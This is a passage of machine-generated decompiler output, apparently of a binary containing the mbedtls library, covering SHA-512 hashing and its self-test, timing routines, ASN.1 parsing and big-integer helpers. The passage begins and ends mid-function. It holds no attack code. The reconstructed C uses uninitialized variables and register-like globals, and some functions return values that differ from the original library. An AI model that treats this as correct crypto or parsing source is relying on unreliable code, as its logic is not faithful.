        *(char *)(g7 + 54) = (char)(*(int32_t *)(g3 + 64) / 256);
        *(char *)(g7 + 55) = (char)*(int32_t *)(g3 + 64);
        *(char *)(g7 + 56) = *(char *)(g3 + 79);
        *(char *)(g7 + 57) = (char)*(int16_t *)(g3 + 78);
        *(char *)(g7 + 58) = (char)(*(int32_t *)(g3 + 76) / 256);
        *(char *)(g7 + 59) = (char)*(int32_t *)(g3 + 76);
        *(char *)(g7 + 60) = (char)(*(int32_t *)(g3 + 72) / 0x1000000);
        *(char *)(g7 + 61) = (char)(*(int32_t *)(g3 + 72) / 0x10000);
        *(char *)(g7 + 62) = (char)(*(int32_t *)(g3 + 72) / 256);
        int32_t v9 = *(int32_t *)(g3 + 72); // 0x8055506
        *(char *)(g7 + 63) = (char)v9;
        result = v9;
        // branch -> 0x805550c
    }
    // 0x805550c
    g3 = v3;
    g7 = v2;
    return result;
}

// Address range: 0x8055530 - 0x805572f
int32_t mbedtls_sha512_self_test(int32_t a1) {
    int32_t v1 = g5; // 0x8055533
    int32_t v2 = g7; // 0x8055534
    int32_t v3 = g3; // 0x8055535
    int32_t v4;
    g3 = &v4;
    mbedtls_sha512_init((char *)&v4);
    int32_t str;
    int32_t v5 = &str; // 0x805554a_0
    int32_t v6 = 0; // 0x805562e24
    char * str2 = (char *)&g26;
    // branch -> 0x8055573
    while (true) {
        int32_t v7 = v6 % 3; // 0x805558e
        int32_t v8 = v6 == 2 | v6 < 2 ^ (1 - v6 & v6) < 0; // 0x80555a4
        int32_t v9 = 4 - v8; // 0x80555b4
        g7 = v9;
        if (a1 != 0) {
            // 0x8055668
            printf("  SHA-%d test #%d: ", 128 * v9, v7 + 1);
            // branch -> 0x80555b6
        }
        // 0x80555b6
        mbedtls_sha512_starts((int32_t *)g3, v8);
        int32_t v10;
        if (v7 == 2) {
            // 0x80556a0
            g1 = 0x61616161;
            int32_t v11;
            memset((char *)&v11, 0x61616161, 250);
            int32_t v12 = 0; // 0x80556be
            // branch -> 0x80556b8
            while (true) {
                // 0x80556b8
                g5 = v12 + 1;
                mbedtls_sha512_update((char *)g3, (char *)&v11, 1000);
                int32_t v13 = g5; // 0x80556d5
                if (v13 == 1000) {
                    v10 = 1000;
                    // break -> 0x80555eb
                    break;
                }
                v12 = v13;
                // continue -> 0x80556b8
            }
          lab_0x80555eb:
            // 0x80555eb
            mbedtls_sha512_finish((int32_t *)g3, (char *)&str, v10);
            uint32_t strncmp_rc = strncmp((char *)&str, str2, 16 * g7);
            g237 = strncmp_rc % 2 == 0;
            int32_t v14; // 0x805564b
            if (strncmp_rc % 2 == 0) {
              lab_0x8055615:
                // 0x8055615
                if (a1 != 0) {
                    // 0x80556e2
                    puts("passed");
                    // branch -> 0x8055620
                }
                int32_t v15 = v6 + 1; // 0x8055620
                if (v15 == 6) {
                    // 0x805563b
                    int32_t v16;
                    g1 = &v16;
                    if (a1 != 0) {
                        // 0x80556f3
                        putchar(10);
                        g1 = 0;
                        // branch -> 0x8055648
                    }
                    // 0x8055648
                    *(char *)g3 = 0;
                    v14 = g3 + 1;
                    g3 = v14;
                    // branch -> 0x8055648
                    while (v14 != v5) {
                        // 0x8055648
                        *(char *)v14 = 0;
                        v14 = g3 + 1;
                        g3 = v14;
                        // continue -> 0x8055648
                    }
                    // 0x8055656
                    g3 = v3;
                    g7 = v2;
                    g5 = v1;
                    return g1;
                }
                // 0x8055620
                v6 = v15;
                str2 = (char *)((int32_t)str2 + 64);
                // branch -> 0x8055573
                continue;
            } else {
                // 0x8055706
                g1 = 1;
                if (a1 != 0) {
                    // 0x8055716
                    puts("failed");
                    g1 = 1;
                    // branch -> 0x8055648
                }
            }
            // 0x8055648
            *(char *)g3 = 0;
            v14 = g3 + 1;
            g3 = v14;
            // branch -> 0x8055648
            while (v14 != v5) {
                // 0x8055648
                *(char *)v14 = 0;
                v14 = g3 + 1;
                g3 = v14;
                // continue -> 0x8055648
            }
            // 0x8055656
            g3 = v3;
            g7 = v2;
            g5 = v1;
            return g1;
        }
        int32_t v17 = *(int32_t *)(4 * v7 + 0x8078b40); // 0x80555cb
        g1 = v17;
        int32_t v18 = 113 * v7 + 0x8078b60; // 0x80555d8
        g5 = v18;
        mbedtls_sha512_update((char *)g3, (char *)v18, v17);
        v10 = v17;
        // branch -> 0x80555eb
        goto lab_0x80555eb;
    }
}

// Address range: 0x8055730 - 0x805579f
int32_t mbedtls_sha512(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    int32_t v1 = g3; // 0x8055733
    int32_t v2;
    int32_t v3 = &v2; // 0x805573a_0
    g3 = v3;
    mbedtls_sha512_init((char *)&v2);
    mbedtls_sha512_starts((int32_t *)g3, a4);
    g1 = a1;
    mbedtls_sha512_update((char *)g3, (char *)a1, a2);
    mbedtls_sha512_finish((int32_t *)g3, (char *)a3, a2);
    g1 = v3;
    int32_t v4;
    g6 = &v4;
    *(char *)v3 = 0;
    int32_t result = g1 + 1; // 0x805578b
    g1 = result;
    // branch -> 0x8055788
    while (result != g6) {
        // 0x8055788
        *(char *)result = 0;
        result = g1 + 1;
        g1 = result;
        // continue -> 0x8055788
    }
    // 0x8055792
    g3 = v1;
    int32_t v5;
    g2 = v5;
    return result;
}

// Address range: 0x80557a7 - 0x80557af
int32_t function_80557a7(int32_t a1) {
    // 0x80557a7
    return g7;
}

// Address range: 0x80557b0 - 0x80557df
int32_t sighandler(int32_t sig_handler) {
    // 0x80557b0
    g212 = 1;
    int32_t prev_sig_handler = (int32_t)signal(sig_handler, (void (**)(int32_t))sighandler); // 0x80557ce_4
    g1 = prev_sig_handler;
    return prev_sig_handler;
}

// Address range: 0x80557e0 - 0x805581f
void (**mbedtls_set_alarm(int32_t a1, int32_t a2))(int32_t) {
    // 0x80557e0
    g212 = 0;
    signal(SIGALARM, (void (**)(int32_t))sighandler);
    int32_t seconds;
    return (void (**)(int32_t))alarm(seconds);
}

// Address range: 0x8055820 - 0x805588f
int32_t mbedtls_timing_get_timer(int32_t * a1, int32_t a2) {
    int32_t v1 = (int32_t)a1; // esi
    int32_t tp;
    gettimeofday((struct timeval *)&tp, NULL);
    int32_t v2;
    int32_t v3;
    if (a2 == 0) {
        int32_t v4 = *(int32_t *)(v1 + 4); // 0x8055851
        int32_t v5 = *(int32_t *)v1; // 0x8055857
        g2 = v3;
        return (v2 - v4) / 1000 + 1000 * (tp - v5);
    }
    // 0x8055878
    *(int32_t *)v1 = tp;
    *(int32_t *)(v1 + 4) = v2;
    g2 = v3;
    return 0;
}

// Address range: 0x8055890 - 0x80558dc
int32_t busy_msleep(int32_t a1) {
    int32_t v1 = g7; // 0x8055896
    int32_t v2 = g3; // 0x8055897
    g3 = 0;
    int32_t v3;
    g7 = &v3;
    mbedtls_timing_get_timer(&v3, 1);
    int32_t result = g3; // 0x80558b813
    if (mbedtls_timing_get_timer((int32_t *)g7, 0) >= g1) {
        // 0x80558cf
        g1 = result;
        g3 = v2;
        g7 = v1;
        return result;
    }
    g3 = result + 1;
    int32_t v4 = g3; // 0x80558b8
    result = v4;
    while (mbedtls_timing_get_timer((int32_t *)g7, 0) < g1) {
        // 0x80558b8
        g3 = v4 + 1;
        v4 = g3;
        result = v4;
        // continue -> 0x80558b8
    }
    // 0x80558cf
    g1 = result;
    g3 = v2;
    g7 = v1;
    return result;
}

// Address range: 0x80558dd - 0x80558df
int32_t function_80558dd(int32_t a1) {
    // 0x80558dd
    return g7;
}

// Address range: 0x80558e0 - 0x805592f
int32_t mbedtls_timing_get_delay(int32_t a1) {
    // 0x80558e0
    g1 = -1;
    int32_t v1 = g3; // 0x80558e8
    g3 = a1;
    if (*(int32_t *)(a1 + 36) == 0) {
        // 0x80558f6
        g3 = v1;
        return -1;
    }
    uint32_t v2 = mbedtls_timing_get_timer((int32_t *)a1, 0); // 0x805590b
    g1 = 2;
    if (v2 >= *(int32_t *)(g3 + 36)) {
        // 0x8055900
        // branch -> 0x80558f6
        // 0x80558f6
        g3 = v1;
        return 2;
    }
    int32_t result = v2 >= *(int32_t *)(g3 + 32); // 0x8055921
    g1 = result;
    g3 = v1;
    return result;
}

// Address range: 0x8055930 - 0x805595f
int32_t mbedtls_timing_set_delay(int32_t result, int32_t a2, int32_t a3, int32_t a4) {
    // 0x8055930
    g1 = result;
    *(int32_t *)(result + 36) = a3;
    *(int32_t *)(result + 32) = a2;
    int32_t v1;
    g2 = v1;
    if (a3 == 0) {
        // 0x8055949
        return result;
    }
    int32_t result2 = mbedtls_timing_get_timer((int32_t *)result, 1); // 0x8055958
    g1 = result2;
    return result2;
}

// Address range: 0x8055960 - 0x8055c2f
int32_t mbedtls_timing_self_test(int32_t a1) {
    int32_t v1 = g5; // 0x8055963
    int32_t v2 = g7; // 0x8055964
    int32_t v3 = g3; // 0x8055965
    if (a1 != 0) {
        // 0x8055ad4
        puts("  TIMING tests note: will take some time!");
        printf("  TIMING test #1 (set_alarm / get_timer): ");
        // branch -> 0x8055974
    }
    // 0x8055974
    g7 = 800;
    int32_t v4 = 1500; // edi
    g3 = 1;
    // branch -> 0x8055988
    while (true) {
        // 0x8055988
        int32_t v5;
        mbedtls_timing_get_timer(&v5, 1);
        mbedtls_set_alarm(g3, 1);
        // branch -> 0x80559a8
        while (g212 == 0) {
            // 0x80559a8
            // continue -> 0x80559a8
        }
        uint32_t v6 = mbedtls_timing_get_timer(&v5, 0); // 0x80559bf
        uint32_t v7 = g7; // 0x80559c4
        if (v6 < v7) {
            // 0x8055ac0
            g1 = 1;
            if (a1 == 0) {
                // 0x8055acc
                g3 = v3;
                g7 = v2;
                g5 = v1;
                return 1;
            }
            // 0x8055af1
            puts("failed");
            g1 = 1;
            g3 = v3;
            g7 = v2;
            g5 = v1;
            return 1;
        }
        uint32_t v8 = v4; // 0x80559cc
        if (v6 <= v8) {
            int32_t v9 = g3 + 1; // 0x80559d4
            g3 = v9;
            v4 = v8 + 1200;
            g7 = v7 + 800;
            if (v9 == 4) {
                // break -> 0x80559e8
                break;
            }
            // continue -> 0x8055988
            continue;
        }
        // 0x8055ac0
        g1 = 1;
        if (a1 == 0) {
            // 0x8055acc
            g3 = v3;
            g7 = v2;
            g5 = v1;
            return 1;
        }
        // 0x8055af1
        puts("failed");
        g1 = 1;
        g3 = v3;
        g7 = v2;
        g5 = v1;
        return 1;
    }
    // 0x80559e8
    if (a1 != 0) {
        // 0x8055b0a
        puts("passed");
        printf("  TIMING test #2 (set/get_delay        ): ");
        // branch -> 0x80559f3
    }
    // 0x80559f3
    g7 = 200;
    int32_t v10;
    g5 = &v10;
    int32_t v11 = 200; // 0x8055a83
    // branch -> 0x8055a72
    while (true) {
        uint32_t v12 = v11 / 8; // 0x8055a76
        g3 = 200;
        int32_t v13 = v11; // 0x8055a8e
        int32_t v14 = 200; // 0x8055a8e
        // branch -> 0x8055a8e
        int32_t v15; // 0x8055a60
        while (true) {
            int32_t v16 = g5; // 0x8055a99
            mbedtls_timing_set_delay(v16, v13, v14 + v13, 0);
            g1 = v11 - v12;
            busy_msleep((int32_t)(char *)v16);
            int32_t v17 = g5; // 0x8055aa9
            if (mbedtls_timing_get_delay(v17) == 0) {
                // 0x8055a00
                g1 = v11 / 4;
                busy_msleep((int32_t)(char *)v17);
                int32_t v18 = g5; // 0x8055a08
                if (mbedtls_timing_get_delay(v18) == 1) {
                    uint32_t v19 = g3; // 0x8055a19
                    g1 = v19 - v12 - v19 / 8;
                    busy_msleep((int32_t)(char *)v18);
                    int32_t v20 = g5; // 0x8055a2a
                    if (mbedtls_timing_get_delay(v20) == 1) {
                        // 0x8055a3b
                        g1 = g3 / 4;
                        busy_msleep((int32_t)(char *)v20);
                        if (mbedtls_timing_get_delay(g5) == 2) {
                            int32_t v21 = g3 + 200; // 0x8055a52
                            g3 = v21;
                            v15 = g7;
                            if (v21 == 600) {
                                // break -> 0x8055a60
                                break;
                            }
                            v13 = v15;
                            v14 = v21;
                            // continue -> 0x8055a8e
                            continue;
                        }
                    }
                }
            }
            // 0x8055ac0
            g1 = 1;
            if (a1 == 0) {
                // 0x8055acc
                g3 = v3;
                g7 = v2;
                g5 = v1;
                return 1;
            }
            // 0x8055af1
            puts("failed");
            g1 = 1;
            g3 = v3;
            g7 = v2;
            g5 = v1;
            return 1;
        }
        int32_t v22 = v15 + 200; // 0x8055a60
        g7 = v22;
        if (v22 == 600) {
            // break -> 0x8055b27
            break;
        }
        v11 = v22;
        // continue -> 0x8055a72
    }
    int32_t v23 = g5; // 0x8055b37
    mbedtls_timing_set_delay(v23, 0, 0, 0);
    g1 = 200;
    busy_msleep((int32_t)(char *)v23);
    int32_t v24 = g5; // 0x8055b49
    char * v25 = (char *)v24; // bp-140
    if (mbedtls_timing_get_delay(v24) != -1) {
        // 0x8055ac0
        g1 = 1;
        if (a1 == 0) {
            // 0x8055acc
            g3 = v3;
            g7 = v2;
            g5 = v1;
            return 1;
        }
        // 0x8055af1
        puts("failed");
        g1 = 1;
        g3 = v3;
        g7 = v2;
        g5 = v1;
        return 1;
    }
    int32_t chars_printed = -1; // 0x8055b6d46
    if (a1 != 0) {
        // 0x8055c0c
        puts("passed");
        v25 = "  TIMING test #3 (hardclock / get_timer): ";
        chars_printed = printf("  TIMING test #3 (hardclock / get_timer): ");
        // branch -> 0x8055b64
    }
    // 0x8055b64
    g7 = 0;
    g5 = 5;
    // branch -> 0x8055b6b
  lab_0x8055b6b:
    while (true) {
        // 0x8055b6b
        g3 = chars_printed;
        g1 = 1;
        int32_t v26 = busy_msleep((int32_t)v25) - chars_printed; // 0x8055b7f
        g3 = 2;
        int32_t v27 = (int64_t)v26 / (int64_t)g5; // 0x8055b88
        uint32_t v28 = v27 + v26; // 0x8055b91
        int32_t v29 = 2; // 0x8055b99
        int32_t v30 = v27; // 0x8055b96
        // branch -> 0x8055b94
        while (true) {
            // 0x8055b94
            g1 = v29;
            int32_t v31 = busy_msleep((int32_t)v25); // 0x8055b9e
            uint32_t v32 = g3; // 0x8055bad
            int32_t v33 = (int64_t)(v31 - v30) / (int64_t)v32; // 0x8055bad
            if (v33 >= v26 - v27) {
                // 0x8055bb4
                if (v33 <= v28) {
                    int32_t v34 = v32 + 1; // 0x8055bb8
                    g3 = v34;
                    if (v34 == 5) {
                        // break -> 0x8055bc0
                        break;
                    }
                    v29 = v34;
                    v30 = v33;
                    // continue -> 0x8055b94
                    continue;
                }
            }
            int32_t v35 = g7 + 1; // 0x8055bec
            g7 = v35;
            if (v35 == 2) {
                // break (via goto) -> 0x8055bf8
                goto lab_0x8055bf8;
            }
            chars_printed = v33;
            // continue (via goto) -> 0x8055b6b
            goto lab_0x8055b6b;
        }
      lab_0x8055bf8:
        // 0x8055bf8
        if (a1 == 0) {
            // 0x8055bc6
            g1 = 0;
            // branch -> 0x8055acc
            // 0x8055acc
            g3 = v3;
            g7 = v2;
            g5 = v1;
            return 0;
        }
        // 0x8055bfe
        puts("failed (ignored)");
        // branch -> 0x8055bd9
        // 0x8055bd9
        putchar(10);
        g1 = 0;
        // branch -> 0x8055acc
        // 0x8055acc
        g3 = v3;
        g7 = v2;
        g5 = v1;
        return 0;
    }
}

// Address range: 0x8055c30 - 0x8055d5f
int32_t mbedtls_asn1_get_len(int32_t * a1, int32_t a2, int32_t * a3) {
    // 0x8055c30
    g4 = (int32_t)a1;
    g6 = a2;
    int32_t v1 = g3; // bp-16
    int32_t v2 = *a1; // 0x8055c4a
    if (a2 - v2 < 1) {
        // 0x8055c80
        return -96;
    }
    int32_t v3 = v2 + 1; // eax
    *a3 = (int32_t)*(char *)v2;
    *(int32_t *)g4 = v3;
    int32_t v4 = g6 - v3; // 0x8055c65
    g6 = v4;
    if (*(int32_t *)(int32_t)a3 <= v4) {
        // 0x8055c6d
        g3 = v1;
        return 0;
    }
    // 0x8055c54
    // branch -> 0x8055c80
    // 0x8055c80
    g3 = v1;
    return -96;
}

// Address range: 0x8055d60 - 0x8055dcf
int32_t mbedtls_asn1_get_tag(int32_t * a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x8055d60
    g4 = (int32_t)a1;
    int32_t v1 = g3; // 0x8055d69
    int32_t v2 = g7; // 0x8055d6f
    int32_t v3 = g5; // 0x8055d75
    int32_t v4 = *a1; // 0x8055d7b
    g6 = v4;
    int32_t result = -96; // 0x8055d99_2
    if (a2 - v4 > 0) {
        // 0x8055da0
        if ((int32_t)*(char *)v4 == a4) {
            // 0x8055da9
            *a1 = v4 + 1;
            g7 = v2;
            g5 = v3;
            g3 = v1;
            int32_t v5;
            int32_t v6;
            return mbedtls_asn1_get_len((int32_t *)v6, v5, a1);
        }
        result = -98;
    }
    // 0x8055d8d
    g3 = v1;
    g7 = v2;
    g5 = v3;
    return result;
}

// Address range: 0x8055e30 - 0x8055edf
int32_t mbedtls_asn1_get_int(int32_t * a1, int32_t a2, int32_t * a3) {
    int32_t v1 = g3; // 0x8055e39
    g3 = (int32_t)a1;
    int32_t v2;
    int32_t result = mbedtls_asn1_get_tag(a1, a2, (int32_t)&v2, 2); // 0x8055e5b
    int32_t result2 = result; // 0x8055e70_2
    if (result == 0) {
        int32_t v3 = v2; // 0x8055e78
        if (v3 < 5) {
            int32_t v4 = *(int32_t *)g3; // 0x8055e85
            if (*(char *)v4 >= 0) {
                // 0x8055e8c
                *a3 = 0;
                g6 = v3;
                if (v3 == 0) {
                    // 0x8055e8c
                    // branch -> 0x8055e64
                } else {
                    v2 = v3 - 1;
                    int32_t v5 = v4 + 1; // 0x8055eb6
                    g4 = v5;
                    *(int32_t *)g3 = v5;
                    int32_t v6 = (int32_t)*(char *)v4; // 0x8055ebd
                    g6 = v6;
                    *a3 = v6;
                    // 0x8055e64
                    g3 = v1;
                    // branch -> 0x8055eb0
                    while (v2 != 0) {
                        // 0x8055eb0
                        v2--;
                        // 0x8055eb0
                        v4 = g4;
                        v5 = v4 + 1;
                        g4 = v5;
                        *(int32_t *)g3 = v5;
                        v6 = (int32_t)*(char *)v4 | 256 * g6;
                        g6 = v6;
                        *a3 = v6;
                        // 0x8055e64
                        g3 = v1;
                        // branch -> 0x8055eb0
                    }
                    return result;
                }
                // 0x8055e64
                g3 = v1;
                return result;
            }
        }
        // 0x8055e7e
        result2 = -100;
        // branch -> 0x8055e64
    }
    // 0x8055e64
    g3 = v1;
    return result2;
}

// Address range: 0x8055f70 - 0x8055fdf
int32_t mbedtls_asn1_get_bitstring_null(int32_t * a1, int32_t a2, int32_t * a3) {
    int32_t v1 = (int32_t)a3;
    int32_t v2 = g3; // 0x8055f76
    int32_t v3 = g7; // 0x8055f7c
    g3 = v1;
    g7 = (int32_t)a1;
    int32_t result = mbedtls_asn1_get_tag(a1, a2, v1, 3); // 0x8055f98
    int32_t result2 = result; // 0x8055faa_2
    if (result == 0) {
        int32_t * v4 = (int32_t *)g3; // 0x8055fb0_0
        uint32_t v5 = *v4; // 0x8055fb0
        g6 = v5;
        int32_t v6 = v5 - 1; // 0x8055fb2
        g4 = v6;
        *v4 = v6;
        if (v5 > 1) {
            int32_t * v7 = (int32_t *)g7; // 0x8055fc3_0
            int32_t v8 = *v7; // 0x8055fc3
            g4 = (int32_t)*(char *)v8;
            int32_t v9 = v8 + 1; // 0x8055fc8
            g6 = v9;
            *v7 = v9;
            if (g4 == 0) {
                // 0x8055fc3
                // branch -> 0x8055fa1
                // 0x8055fa1
                g3 = v2;
                g7 = v3;
                return result;
            }
        }
        // 0x8055fbc
        result2 = -104;
        // branch -> 0x8055fa1
    }
    // 0x8055fa1
    g3 = v2;
    g7 = v3;
    return result2;
}

// Address range: 0x8055fe0 - 0x80560cf
int32_t mbedtls_asn1_get_alg(int32_t * a1, int32_t a2, int32_t * a3, char * a4) {
    int32_t v1 = g3; // 0x8055fe6
    g3 = (int32_t)a1;
    int32_t v2 = g7; // 0x8055fef
    g7 = a2;
    int32_t v3 = g5; // 0x8055ff5
    g5 = (int32_t)a3;
    int32_t v4;
    int32_t result = mbedtls_asn1_get_tag(a1, a2, (int32_t)&v4, 48); // 0x805600e
    if (result != 0) {
        // 0x8056017
        g3 = v1;
        g7 = v2;
        g5 = v3;
        return result;
    }
    int32_t v5 = *(int32_t *)g3; // 0x8056028
    g6 = v5;
    int32_t result2 = -96; // eax
    if (g7 - v5 >= 1) {
        // 0x8056035
        *(int32_t *)g5 = (int32_t)*(char *)v5;
        int32_t v6 = g6 + v4; // 0x8056040
        g7 = v6;
        int32_t v7 = mbedtls_asn1_get_tag((int32_t *)g3, v6, g5 + 4, 6); // 0x8056055
        result2 = v7;
        if (v7 == 0) {
            // 0x805605e
            *(int32_t *)(g5 + 8) = *(int32_t *)g3;
            int32_t * v8 = (int32_t *)g3; // 0x8056063_0
            int32_t v9 = *(int32_t *)(g5 + 4) + *v8; // 0x8056065
            *v8 = v9;
            if (g7 == v9) {
                int32_t v10 = (int32_t)a4;
                g6 = v10;
                g4 = v10 + 12;
                *(char *)v10 = 0;
                int32_t v11 = g6 + 1; // 0x80560bb
                g6 = v11;
                // branch -> 0x80560b8
                while (v11 != g4) {
                    // 0x80560b8
                    *(char *)v11 = 0;
                    v11 = g6 + 1;
                    g6 = v11;
                    // continue -> 0x80560b8
                }
                // 0x8056017
                g3 = v1;
                g7 = v2;
                g5 = v3;
                return result2;
            }
            int32_t v12 = (int32_t)a4;
            int32_t * v13 = (int32_t *)g3; // 0x8056074_0
            *v13 = *v13 + 1;
            *(int32_t *)v12 = (int32_t)*(char *)v9;
            int32_t v14 = mbedtls_asn1_get_len((int32_t *)g3, g7, (int32_t *)(v12 + 4)); // 0x8056089
            result2 = v14;
            if (v14 == 0) {
                // 0x8056092
                g4 = v12;
                *(int32_t *)(v12 + 8) = *(int32_t *)g3;
                int32_t * v15 = (int32_t *)g3; // 0x805609a_0
                int32_t v16 = *(int32_t *)(g4 + 4) + *v15; // 0x805609c
                *v15 = v16;
                g6 = -102;
                if (g7 != v16) {
                    // if_80560a8_0_true
                    result2 = -102;
                    // branch -> 0x8056017
                }
            }
            // 0x8056017
            g3 = v1;
            g7 = v2;
            g5 = v3;
            return result2;
        }
    }
    // 0x8056017
    g3 = v1;
    g7 = v2;
    g5 = v3;
    return result2;
}

// Address range: 0x80561a0 - 0x8056206
int32_t mbedtls_asn1_get_alg_null(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    int32_t v1 = 0; // bp-16
    int32_t result = mbedtls_asn1_get_alg((int32_t *)a1, a2, (int32_t *)a3, (char *)&v1); // 0x80561d6
    g1 = result;
    int32_t v2;
    if (result != 0) {
        // 0x80561df
        g2 = v2;
        return result;
    }
    if (v1 == 0 || v1 == 5) {
        // 0x80561fe
        g2 = v2;
        return 0;
    }
    // 0x80561f7
    g1 = -104;
    g2 = v2;
    return -104;
}

// Address range: 0x8056207 - 0x805620f
int32_t function_8056207(int32_t a1) {
    // 0x8056207
    return g7;
}

// Address range: 0x80562f0 - 0x805633f
int32_t mbedtls_asn1_get_mpi(int32_t * a1, int32_t a2, int32_t a3) {
    int32_t v1 = g3; // 0x80562f3
    g3 = (int32_t)a1;
    int32_t v2;
    int32_t v3 = mbedtls_asn1_get_tag(a1, a2, (int32_t)&v2, 2); // 0x8056313
    int32_t result = v3; // 0x805633e_2
    if (v3 == 0) {
        int32_t v4 = *(int32_t *)g3; // 0x8056323
        int32_t v5 = mbedtls_mpi_read_binary(a3, (char *)v4, v2); // eax
        int32_t v6 = v2; // 0x8056334
        g6 = v6;
        int32_t * v7 = (int32_t *)g3; // 0x8056337_0
        *v7 = *v7 + v6;
        result = v5;
        // branch -> 0x8056339
    }
    // 0x8056339
    g3 = v1;
    return result;
}

// Address range: 0x8056340 - 0x805635f
int32_t mbedtls_mpi_init(int32_t * a1) {
    int32_t result = (int32_t)a1;
    if (a1 != NULL) {
        // 0x805634a
        *a1 = 1;
        *(int32_t *)(result + 4) = 0;
        *(int32_t *)(result + 8) = 0;
        // branch -> 0x805635e
    }
    // 0x805635e
    return result;
}

// Address range: 0x8056360 - 0x805638f
int32_t mbedtls_mpi_get_bit(int32_t a1, uint32_t a2) {
    // 0x8056360
    g4 = a2;
    int32_t v1 = 32 * *(int32_t *)(a1 + 4); // 0x805636f
    g6 = v1;
    int32_t result = 0; // 0x805638b_2
    if (v1 > a2) {
        uint32_t v2 = a2 % 32; // 0x805637b
        g4 = v2;
        int32_t v3 = a2 / 32; // 0x805637e
        g6 = v3;
        uint32_t v4 = *(int32_t *)(*(int32_t *)(a1 + 8) + 4 * v3); // 0x8056381
        int32_t v5; // 0x8056386
        if (v2 != 0) {
            // if_8056384_0_true
            v5 = v4 >> v2;
            // branch -> after_if_8056384_0
        } else {
            v5 = v4;
        }
        // after_if_8056384_0
        result = v5 % 2;
        // branch -> 0x8056389
    }
    // 0x8056389
    return result;
}

// Address range: 0x8056390 - 0x80563df
int32_t mbedtls_mpi_lsb(int32_t a1) {
    uint32_t v1 = *(int32_t *)(a1 + 4); // 0x8056399
    if (v1 == 0) {
        // 0x80563cf
        g1 = 0;
        // branch -> 0x80563c0
    } else {
        // 0x80563a0
        g1 = 0;
        int32_t v2 = 0; // 0x80563b319
        int32_t v3 = 0; // 0x80563c8
        // branch -> 0x80563a7
        while (true) {
            uint32_t v4 = *(int32_t *)(4 * v3 + *(int32_t *)(a1 + 8)); // 0x80563a7
            int32_t result = v2; // 0x80563b3
            // branch -> 0x80563bb
            int32_t v5; // 0x80563b3
            for (uint32_t i = 0; i < 32; i++) {
                // 0x80563bb
                if (1 << i % 32 < v4) {
                    // 0x80563c0
                    // branch -> 0x80563c0
                    // 0x80563c0
                    return result;
                }
                // 0x80563b0
                v5 = result + 1;
                g1 = v5;
                // PHI copies at the loop end
                result = v5;
                // loop 0x80563bb end
            }
            int32_t v6 = v3 + 1; // 0x80563c8
            if (v1 <= v6) {
                // break -> 0x80563cf
                break;
            }
            v2 = v5;
            v3 = v6;
            // continue -> 0x80563a7
        }
        // 0x80563cf
        // branch -> 0x80563cf
        // 0x80563cf
        g1 = 0;
        // branch -> 0x80563c0
    }
    // 0x80563c0
    return 0;
}

// Address range: 0x80563e0 - 0x805644f
int32_t mbedtls_mpi_bitlen(int32_t a1, int32_t a2) {
    // 0x80563e0
    g4 = a1;
    int32_t v1 = *(int32_t *)(a1 + 4); // 0x80563e9
    g6 = v1;
    int32_t v2;
    if (v1 == 0) {
        // 0x8056433
        g2 = v2;
        return 0;
    }
    int32_t v3 = v1 - 1; // 0x80563f2
    int32_t v4 = *(int32_t *)(a1 + 8); // 0x805643d
    if (v1 == 1) {
        // 0x805643d
        g4 = *(int32_t *)v4;
        // branch -> 0x8056422
        // 0x8056422
        g6 = 0;
        // branch -> 0x8056433
        // 0x8056433
        g2 = v2;
        return 0;
    }
    int32_t v5 = *(int32_t *)(v4 + 4 * v3); // 0x80563fa
    g4 = v5;
    int32_t result; // 0x8056438
    if (v5 == 0) {
        int32_t v6 = v3; // 0x805640f
        while (true) {
            int32_t v7 = v6 - 1; // 0x805640f
            if (v7 == 0) {
                // 0x8056414
                g4 = *(int32_t *)v4;
                // branch -> 0x8056422
                // 0x8056422
                g6 = 0;
                // branch -> 0x8056433
                // 0x8056433
                g2 = v2;
                return 0;
            }
            int32_t v8 = *(int32_t *)(4 * v7 + v4); // 0x8056408
            g4 = v8;
            if (v8 != 0) {
                // break -> 0x8056438
                break;
            }
            v6 = v7;
            // continue -> 0x805640f
        }
        // 0x8056438
        // branch -> 0x8056438
        // 0x8056438
        // branch -> 0x8056422
    } else {
        // 0x8056438
        result = 32 * v3;
        // branch -> 0x8056422
    }
    // 0x8056422
    g6 = 0;
    // branch -> 0x8056433
    // 0x8056433
    g2 = v2;
    return result;
}

// Address range: 0x8056450 - 0x805646f
int32_t mbedtls_mpi_size(int32_t a1) {
    // 0x8056450
    int32_t v1;
    int32_t v2 = mbedtls_mpi_bitlen(a1, v1); // 0x805645c
    g2 = v1;
    int32_t result = (v2 + 7) / 8; // 0x8056465
    g1 = result;
    return result;
}

// Address range: 0x8056470 - 0x805653f
int32_t mbedtls_mpi_cmp_abs(int32_t a1, int32_t a2) {
    int32_t v1 = *(int32_t *)(a1 + 4); // 0x805647c
    g4 = v1;
    uint32_t v2 = 0; // 0x80564f6
    uint32_t v3; // 0x80564d4
    int32_t v4; // 0x80564c7
    int32_t v5; // 0x805651c
    int32_t v6; // 0x80564b3
    int32_t v7; // 0x80564f6
    int32_t v8; // 0x80564a9
    int32_t v9; // 0x80564b0
    int32_t v10; // 0x80564f9
    int32_t v11; // 0x80564fc
    uint32_t v12; // 0x80564ff
    uint32_t v13; // 0x8056502
    int32_t v14; // 0x80564ff
    int32_t v15; // 0x8056510
    uint32_t v16; // 0x8056514
    if (v1 != 0) {
        int32_t v17 = *(int32_t *)(a1 + 8); // 0x8056483
        int32_t v18 = v1 - 1; // 0x8056486
        if (*(int32_t *)(v17 + 4 * v18) == 0) {
            // 0x80564a3
            g4 = v18;
            uint32_t v19; // 0x8056510
            if (v18 != 0) {
                // branch -> 0x8056498
                while (true) {
                    // 0x8056498
                    if (*(int32_t *)(v17 - 4 + 4 * v18) == 0) {
                        int32_t v20 = v18 - 1; // 0x80564a0
                        g4 = v20;
                        if (v20 == 0) {
                            v2 = 0;
                            // break -> 0x80564a3
                            break;
                        }
                        v18 = v20;
                        // continue -> 0x8056498
                        continue;
                    } else {
                        // 0x8056498
                        v2 = v18;
                        // branch -> 0x80564a9
                    }
                    // 0x80564a9
                    v8 = *(int32_t *)(a2 + 4);
                    if (v8 != 0) {
                        // 0x80564b0
                        v9 = *(int32_t *)(a2 + 8);
                        v6 = v8 - 1;
                        if (*(int32_t *)(v9 + 4 * v6) == 0) {
                            // 0x80564ca
                            if (v6 != 0) {
                                // 0x80564c0
                                v4 = v6;
                                // branch -> 0x80564c0
                                while (true) {
                                    // 0x80564c0
